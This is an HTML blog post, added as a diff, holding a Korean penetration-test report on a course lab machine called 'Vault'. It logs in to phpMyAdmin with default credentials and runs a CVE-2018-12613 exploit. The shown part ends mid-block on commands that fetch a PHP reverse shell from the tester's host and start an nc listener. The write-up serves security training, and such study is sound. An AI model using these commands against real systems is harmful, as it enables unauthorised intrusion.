@@ -1,0 +1,550 @@
+<!doctype html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="shortcut icon" href="/images/favicon.png" />
+
+<title>[BHPT] Vault&nbsp;|&nbsp;Wook&#39;s blog</title>
+<meta
+  name="title"
+  content="[BHPT] Vault"
+/>
+<meta
+  name="description"
+  content="이 보고서는 한국 레드라쿤 커뮤니티에서 개발하고 진행하는 BHPT (Basic Host-based Penetration Testing) 강의를 듣고 강의에서 제공하는 랩 머신 중 하나인 Vault 랩 머신을 내가 혼자 풀어보고 보고서까지 써본 것을 블로그에 옮긴 것이다.
+This report is based on the Red Raccoon community&rsquo;s BHPT (Basic Host-based Penetration Testing) course, developed and conducted by the community. I completed the Vault lab machine provided in the course on my own and wrote this report, which I am now posting on my blog."
+/>
+<meta
+  name="keywords"
+  content="BHPT,"
+/>
+
+  <meta name="author" content="Wook Lee" />
+
+
+
+
+<meta property="og:url" content="http://localhost:1313/posts/bhpt-vault/">
+  <meta property="og:site_name" content="Wook&#39;s blog">
+  <meta property="og:title" content="[BHPT] Vault">
+  <meta property="og:description" content="이 보고서는 한국 레드라쿤 커뮤니티에서 개발하고 진행하는 BHPT (Basic Host-based Penetration Testing) 강의를 듣고 강의에서 제공하는 랩 머신 중 하나인 Vault 랩 머신을 내가 혼자 풀어보고 보고서까지 써본 것을 블로그에 옮긴 것이다.
+This report is based on the Red Raccoon community’s BHPT (Basic Host-based Penetration Testing) course, developed and conducted by the community. I completed the Vault lab machine provided in the course on my own and wrote this report, which I am now posting on my blog.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-11-10T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-11-10T00:00:00+00:00">
+    <meta property="article:tag" content="BHPT">
+
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="[BHPT] Vault">
+  <meta name="twitter:description" content="이 보고서는 한국 레드라쿤 커뮤니티에서 개발하고 진행하는 BHPT (Basic Host-based Penetration Testing) 강의를 듣고 강의에서 제공하는 랩 머신 중 하나인 Vault 랩 머신을 내가 혼자 풀어보고 보고서까지 써본 것을 블로그에 옮긴 것이다.
+This report is based on the Red Raccoon community’s BHPT (Basic Host-based Penetration Testing) course, developed and conducted by the community. I completed the Vault lab machine provided in the course on my own and wrote this report, which I am now posting on my blog.">
+
+
+
+
+
+  <meta itemprop="name" content="[BHPT] Vault">
+  <meta itemprop="description" content="이 보고서는 한국 레드라쿤 커뮤니티에서 개발하고 진행하는 BHPT (Basic Host-based Penetration Testing) 강의를 듣고 강의에서 제공하는 랩 머신 중 하나인 Vault 랩 머신을 내가 혼자 풀어보고 보고서까지 써본 것을 블로그에 옮긴 것이다.
+This report is based on the Red Raccoon community’s BHPT (Basic Host-based Penetration Testing) course, developed and conducted by the community. I completed the Vault lab machine provided in the course on my own and wrote this report, which I am now posting on my blog.">
+  <meta itemprop="datePublished" content="2024-11-10T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-11-10T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1807">
+  <meta itemprop="keywords" content="BHPT">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+    
+    <link href="/simple.min.css" rel="stylesheet" />
+
+    
+    <link href="/style.min.css" rel="stylesheet" />
+
+    
+
+    
+</head>
+
+  <body>
+    <header>
+      <nav>
+  <a
+    href="/"
+    
+    >Home</a
+  >
+
+  <a
+    href="/posts/"
+    
+    >Posts</a
+  >
+
+
+  <a href="/index.xml">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon" viewBox="0 0 448 512">
+      
+      <path
+        d="M0 64C0 46.3 14.3 32 32 32c229.8 0 416 186.2 416 416c0 17.7-14.3 32-32 32s-32-14.3-32-32C384 253.6 226.4 96 32 96C14.3 96 0 81.7 0 64zM0 416a64 64 0 1 1 128 0A64 64 0 1 1 0 416zM32 160c159.1 0 288 128.9 288 288c0 17.7-14.3 32-32 32s-32-14.3-32-32c0-123.7-100.3-224-224-224c-17.7 0-32-14.3-32-32s14.3-32 32-32z"
+      />
+    </svg>
+    RSS
+  </a>
+
+</nav>
+
+<h1>[BHPT] Vault</h1>
+
+
+    </header>
+    <main>
+      
+  
+  
+  <content>
+    <p>이 보고서는 한국 <a href="https://www.redraccoon.kr/" target="_blank"><strong>레드라쿤</strong></a> 커뮤니티에서 개발하고 진행하는 BHPT (Basic Host-based Penetration Testing) 강의를 듣고 강의에서 제공하는 랩 머신 중 하나인 <code>Vault</code> 랩 머신을 내가 혼자 풀어보고 보고서까지 써본 것을 블로그에 옮긴 것이다.</p>
+<p>This report is based on the <strong>Red Raccoon</strong> community&rsquo;s BHPT (Basic Host-based Penetration Testing) course, developed and conducted by the community. I completed the <code>Vault</code> lab machine provided in the course on my own and wrote this report, which I am now posting on my blog.</p>
+<hr>
+<h1 id="vault">Vault</h1>
+<p>report written by <code>leewook</code></p>
+<hr>
+<h3 id="목차">목차</h3>
+<ol>
+<li>개요</li>
+</ol>
+<ul>
+<li>1.1 총평</li>
+<li>1.2 취약점 목차</li>
+</ul>
+<ol start="2">
+<li>모의해킹 수행 내용</li>
+</ol>
+<ul>
+<li>2.1 정보 수집</li>
+<li>2.2 초기 침투</li>
+<li>2.3 권한 상승</li>
+</ul>
+<ol start="3">
+<li>
+<p>취약점</p>
+</li>
+<li>
+<p>증거 스크린샷</p>
+</li>
+<li>
+<p>아티팩트 및 레퍼런스</p>
+</li>
+</ol>
+<hr>
+<h3 id="1-개요">1. 개요</h3>
+<h4 id="11-총평">1.1 총평</h4>
+<p>본 보고서는 2024년 11월 10일에 Vault 호스트에 대한 보안 취약점 진단 및 침투테스트를 목적으로 모의해킹 작업을 요약한 결과물 입니다.</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">수행원</th>
+          <th style="text-align: center">수행일자</th>
+          <th style="text-align: center">호스트 이름</th>
+          <th style="text-align: center">IP 주소</th>
+          <th style="text-align: center">목적</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">leewook</td>
+          <td style="text-align: center">11/10/2024</td>
+          <td style="text-align: center">Vault</td>
+          <td style="text-align: center">172.31.147.149</td>
+          <td style="text-align: center">보안 취약점 진단 및 침투 테스트</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>서비스 확인 및 초기 접근</strong>
+본 모의해킹 수행원은 타켓 IP 주소를 대상으로  Gobuster 툴을 활용한 브루트 포싱 공격을 수행하여 <code>/phpmyadmin</code> 디렉토리의 존재를 확인하였고, phpMyAdmin 서비스의 로그인 계정이 기본 설정인 <code>root:password</code>로 설정되어 있는 것을 발견하였습니다.</p>
+<p><strong>취약점 확인 및 공격</strong>
+해당 phpMyAdmin 페이지는 잘 알려진 취약점인 <code>CVE-2018-12613</code>이 존재하는 <code>phpMyAdmin 4.8.1</code>버전을 사용하고 있음을 확인하였습니다. 이 취약점을 활용해 대상 호스트 (Vault)에 침투하는 데 성공하였습니다.</p>
+<p><strong>권한 상승 및 root 권한 획득</strong>
+시스템 내부에서 <code>linpeas</code> 툴을 사용하여 <code>bobbyz</code> 유저와 해당 유저의 계정 비밀번호가 포함된 <code>.bobbyz_creds.txt</code> 파일을 발견하였으며, 이를 통해 <code>bobbyz</code> 게정으로의 권한 상승을 진행할 수 있었습니다. 이후, <code>sudo </code> 커맨드를 통해 추가 권한 상승을 수행하여 최종적으로 호스트에서 root 권한을 획득하였습니다.</p>
+<p><strong>취약점 분석 및 권고사항</strong>
+기본 계정을 유지하면, 공격자가 쉽게 접근할 수 있는 경로를 제공합니다. 특히, phpMyAdmin과 같은 민감한 데이터 베이스 관리 도구는 기본 계정으로 방치될 경우 심각한 데이터 유출 위험을 초래할 수 있습니다. 초기 설치시 계정을 반드시 변경하고, 복잡한 비밀번호를 설정하시길 권고 드립니다. 또한, 민감한 정보가 포함된 파일이 시스템 내에 평문으로 저장될 경우, 악의적인 사용자가 이를 열람하여 추가 권한 획득 및 시스탬 침해에 악용할 수 있습니다. 계정 정보와 같은 민감한 데이터는 평문으로 저장하지 않고, 암호화하고 불필요한 파일은 주기적으로 삭제하여 노출 위험을 최소화하시길 권고 드립니다. 마지막으로 해당 호스트에서 사용중인 OpenSSh 7.6p1과 Apache httpd 2.4.29 서비스들은 최신 안정 버전이 아니며, 비록 현재 버전에 심각한 취약점이 알려지지 않았더라도, 오래된 버전은 점점 더 공격에 노출될 위험이 있으니 최신버전으로의 업그레이드를 통해 알려지지 않은 취약점에 대비하시길 권고 드립니다.</p>
+<hr>
+<h4 id="12-취약점-목차">1.2 취약점 목차</h4>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">이름</th>
+          <th style="text-align: center">중요도</th>
+          <th style="text-align: center">설명</th>
+          <th style="text-align: center">대응 방안</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">기본 계정 설정</td>
+          <td style="text-align: center">상</td>
+          <td style="text-align: center"><code>/phpmyadmin</code>디렉토리의 접근 계정 설정이 기본 설정으로 되어 있으며 이는 심각한 데이터 유출 위험을 초래할 가능성 존재</td>
+          <td style="text-align: center">초기  설정된 계정을 반드시 변경하고 복잡한 비밀번호 설정</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">phpMyAdmin 4.8.1</td>
+          <td style="text-align: center">상</td>
+          <td style="text-align: center">해당 <code>phpMyAdmin</code> 서비스의 버전은 잘 알려진 취약점을 포함</td>
+          <td style="text-align: center">버전 업데이트</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">평문화된 계정 정보</td>
+          <td style="text-align: center">상</td>
+          <td style="text-align: center">호스트 시스템내에 존재하는 <code>.bobbyz_cred.txt</code>파일에 한 유저의 유저이름과 비밀번호가 평문으로 저장되어 있음</td>
+          <td style="text-align: center">암호화 및 불필요한 파일 삭제</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h3 id="2-모의해킹-수행-내용">2. 모의해킹 수행 내용</h3>
+<h4 id="21-정보-수집---포트스캐닝">2.1 정보 수집 - 포트스캐닝</h4>
+<p>첫번째로 타겟 호스트의 IP 주소를 대상으로 Nmap 툴을 활용해 어떠한 포트가 열려있는지 모든 포트를 대상으로 포트스캐닝 작업을 진행하였습니다.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/bhpt/vault<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ nmap -sS 172.31.147.149 -p- -Pn -n --open -T4 -oA vault_allPorts                                                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#89dceb;font-weight:bold">[</span>...<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>80/tcp open  http
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 59.20 seconds</span></span></code></pre></div>
+<p>그 이후 발견된 포트 22번, 80번을 대상으로 다시 한번 Nmap 툴을 활용해 더 자세한 포트스캐닝 작업을 진행하였습니다.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/bhpt/vault<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nmap -sS -sC -sV 172.31.147.149 -p 22,80 -Pn -n --open -oA vault_Detailed
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#89dceb;font-weight:bold">[</span>...<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>|   <span style="color:#fab387">2048</span> aa:81:52:66:02:66:e0:6a:fc:63:48:30:27:5e:51:d1 <span style="color:#89dceb;font-weight:bold">(</span>RSA<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>|   <span style="color:#fab387">256</span> 9e:d0:fd:c3:d5:a3:0e:ec:9d:79:60:6a:a1:24:c2:17 <span style="color:#89dceb;font-weight:bold">(</span>ECDSA<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>|_  <span style="color:#fab387">256</span> 2e:90:69:1f:93:d4:7a:3e:14:fd:1b:cd:5b:d7:8e:df <span style="color:#89dceb;font-weight:bold">(</span>ED25519<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>80/tcp open  http    Apache httpd 2.4.29 <span style="color:#89dceb;font-weight:bold">((</span>Ubuntu<span style="color:#89dceb;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>|_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>|_http-server-header: Apache/2.4.29 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#89dceb;font-weight:bold">[</span>...<span style="color:#89dceb;font-weight:bold">]</span></span></span></code></pre></div>
+<p><strong>포트 스캐닝 결과</strong>
+Port 22 Ubuntu Linux</p>
+<ul>
+<li>OpenSSH 7.6p1 was released in October 2017</li>
+</ul>
+<p>Port 80 Apache Ubuntu</p>
+<ul>
+<li>Apache httpd 2.4.29 ((Ubuntu))</li>
+<li>Apache2 Ubuntu Default Page</li>
+</ul>
+<p><img src="Pasted%20image%2020241109112010.png#center" alt="alt text"></p>
+<p>80번 포트 홈페이지를 Apache2 Ubuntu 기본 페이지에 명시되어 있는 것 처럼 사용자 지정 홈페이지로 대체하는 것을 권고 드립니다. 버전 정보 노출의 위험을 줄이고 보안 모범 사례를 준수할 수 있습니다.</p>
+<hr>
+<h4 id="21-정보-수집---웹">2.1 정보 수집 - 웹</h4>
+<p>포트 22번 OpenSSH 7.6p1에 대한 악용 가능한 공격은 찾을 수 없어, 포트 80번에 대한 더 자세한 정보 수집을 위해 Gobuster 툴을 활용한 디렉토리 버스팅을 진행하였습니다.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/bhpt/vault<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ gobuster dir -u http://172.31.147.149 -w /usr/share/wordlists/dirb/common.txt 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#89dceb;font-weight:bold">[</span>...<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>/.hta                 <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 279<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>/.htpasswd            <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 279<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>/.htaccess            <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 279<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>/index.html           <span style="color:#89dceb;font-weight:bold">(</span>Status: 200<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 10918<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>/phpmyadmin           <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 321<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://172.31.147.149/phpmyadmin/<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>/server-status        <span style="color:#89dceb;font-weight:bold">(</span>Status: 403<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 279<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Progress: <span style="color:#fab387">4614</span> / <span style="color:#fab387">4615</span> <span style="color:#89dceb;font-weight:bold">(</span>99.98%<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#f5e0dc">Finished</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span></span></span></code></pre></div>
+<p><code>/phpmyadmin</code>에 접속 가능한 것을 확인하였고 기본 계정인 <code>root</code> 사용자 이름과 빈 비밀번호를 입력하여 기본 계정 설정이 되어있는지 확인을 진행하였습니다.</p>
+<p><img src="Pasted%20image%2020241109112707.png#center" alt="alt text"></p>
+<p>빈 비밀번호는 차단이 되지만 또 다른 기본 설정 계정, <code>root:password</code> pair를 사용하여 성공적으로 로그인이 되는 것을 확인하였습니다.</p>
+<p><img src="Pasted%20image%2020241109141747.png#center" alt="alt text"></p>
+<p><code>/phpmyadmin/index.php</code> 에 성공적으로 로그인 후, 우측 하단에 <code>phpMyAdmin 4.8.1</code> 버전을 사용중인 것을 확인하였습니다.</p>
+<p><img src="Pasted%20image%2020241109112824.png#center" alt="alt text"></p>
+<hr>
+<h4 id="22-초기-침투">2.2 초기 침투</h4>
+<p><strong>취약점 확인 및 공격</strong>
+<code>/phpmyadmin</code>에서 확인한 버전을 토대로 취약점 검색을 진행하였고 해당 버전은 잘 알려진 취약점(<code>CVE-2018-12613</code>) 을 포함하고 있으며, 이는 Remote Code Execution 공격이 가능한 것을 exploit-db에서 확인하였습니다.</p>
+<p><img src="Pasted%20image%2020241109143812.png#center" alt="alt text"></p>
+<br>
+<p>Exploit의 사용법에 따라 IP 주소, 포트 넘버, phpmyadmin의 경로, 정보 수집 파트에서 찾은 유저명과 비밀번호, 그리고 마지막으로 사용할 명령어까지 parameter로 넣어서 제대로 동작하는 것을 확인하였습니다.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/bhpt/vault<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ python2 50457.py 172.31.147.149 <span style="color:#fab387">80</span> /phpmyadmin root password whoami                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>www-data</span></span></code></pre></div>
+<p>타겟 호스트 내부로 침투하기 위해 먼저 로컬에서 리버스 쉘을 생성한 후, 이를 위 exploit을 이용해 타겟 호스트로 전송하여 실행하는 방식으로 진행했습니다.</p>
+<p>리버스 쉘은 Pentest Monkey의 php 리버스 쉘을 사용했으며 IP 주소와 포트 넘버를 본 수행원의 주소와 임의의 포트넘버 1234를 지정했습니다.</p>
+<p><img src="Pasted%20image%2020241109113956.png#center" alt="alt text"></p>
+<p>로컬에서 먼저 <code>python3 -m http.server 8888</code> 명령어를 사용하여 http server를 열어주고 해당 첫번째 코드를 사용해,  보통 쓰기 권한이 허용되어 있는<code>/tmp</code>디렉토리 안에 리버스 쉘 파일을 저장하였습니다.</p>
+<p><code>ls -la</code> 명령어를 사용해 파일이 무사히 옮겨졌는지 여부와 실행 권한을 확인하였습니다. <code>chmod  +x</code>로 해당 리버스 쉘 파일에게 실행 권한을 부여하고 다시 확인하였으며 리버스 쉘을 실행하기 전에 <code>nc -lvnp 1234</code>로 리버스 쉘 리스너 준비를 하였습니다.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/bhpt/vault<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ python2 50457.py 172.31.147.149 <span style="color:#fab387">80</span> /phpmyadmin root password <span style="color:#a6e3a1">&#34;wget http://10.8.0.97:8888/revshell.php -O /tmp/revshell.php&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/bhpt/vault<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>└─$ python3 -m http.server <span style="color:#fab387">8888</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Serving HTTP on 0.0.0.0 port <span style="color:#fab387">8888</span> <span style="color:#89dceb;font-weight:bold">(</span>http://0.0.0.0:8888/<span style="color:#89dceb;font-weight:bold">)</span> ...
